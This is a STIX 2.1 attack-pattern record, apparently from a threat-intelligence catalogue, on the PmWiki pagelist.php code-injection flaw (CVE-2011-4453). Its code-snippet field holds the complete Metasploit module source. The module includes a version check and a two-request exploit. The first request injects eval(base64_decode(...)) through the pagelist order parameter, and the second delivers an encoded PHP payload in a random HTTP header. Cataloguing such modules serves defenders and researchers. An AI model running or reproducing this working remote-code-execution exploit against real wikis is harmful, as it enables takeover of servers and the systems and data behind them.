{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7872c9db-bd60-493e-afb4-7f61a68641d9",
    "created": "2024-08-14T17:11:47.441028Z",
    "modified": "2024-08-14T17:11:47.441032Z",
    "name": "PmWiki pagelist.php Remote PHP Code Injection Exploit",
    "description": " This module exploits an arbitrary command execution vulnerability in PmWiki from 2.0.0 to 2.2.34. The vulnerable function is inside /scripts/pagelist.php.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/pmwiki_pagelist.rb",
            "external_id": "pmwiki_pagelist.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4453"
        },
        {
            "source_name": "reference",
            "url": "http://www.pmwiki.org/wiki/PITS/01271"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'PmWiki pagelist.php Remote PHP Code Injection Exploit',\n      'Description'    => %q{\n        This module exploits an arbitrary command execution vulnerability\n        in PmWiki from 2.0.0 to 2.2.34. The vulnerable function is\n        inside /scripts/pagelist.php.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'EgiX',  # Vulnerability discovery and exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>' # Metasploit Module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-4453'],\n          ['BID', '50776'],\n          ['OSVDB', '77261'],\n          ['EDB', '18149'],\n          ['URL', 'http://www.pmwiki.org/wiki/PITS/01271']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Keys'        => ['php'],\n          'Space'       => 4000,\n          'DisableNops' => true,\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Automatic',{}]],\n      'DisclosureDate' => '2011-11-09',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI',[true, \"The path to the pmwiki installation\", \"/\"]),\n      ])\n  end\n\n  def check\n    uri = normalize_uri(datastore['URI'])\n    uri += (datastore['URI'][-1, 1] == \"/\") ? 'pmwiki.php?n=PmWiki.Version' : '/pmwiki.php?n=PmWiki.Version'\n\n    res = send_request_raw(\n      {\n        'uri' => uri\n      }, 25)\n\n    if (res and res.body =~ /pmwiki-2.[0.00-2.34]/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    p = Rex::Text.encode_base64(payload.encoded)\n    header = rand_text_alpha_upper(3)\n    header_append = rand_text_alpha_upper(4)\n\n    uri = normalize_uri(datastore['URI'], \"pmwiki.php\")\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => uri,\n      'vars_post' =>\n        {\n          'action' => 'edit',\n          'post' => 'save',\n          'n' => \"#{header}.#{header_append}\",\n          'text' => \"(:pagelist order=']);error_reporting(0);eval(base64_decode($_SERVER[HTTP_#{header}]));die;#:)\",\n        }\n      }, 25)\n\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => uri,\n      'headers' =>\n        {\n          header => p,\n          'Connection' => 'Close',\n        },\n      'vars_post' =>\n        {\n          'n' => \"#{header}.#{header_append}\",\n        }\n    }, 25)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-09",
    "x_mitre_platforms": [
        "['php']"
    ]
}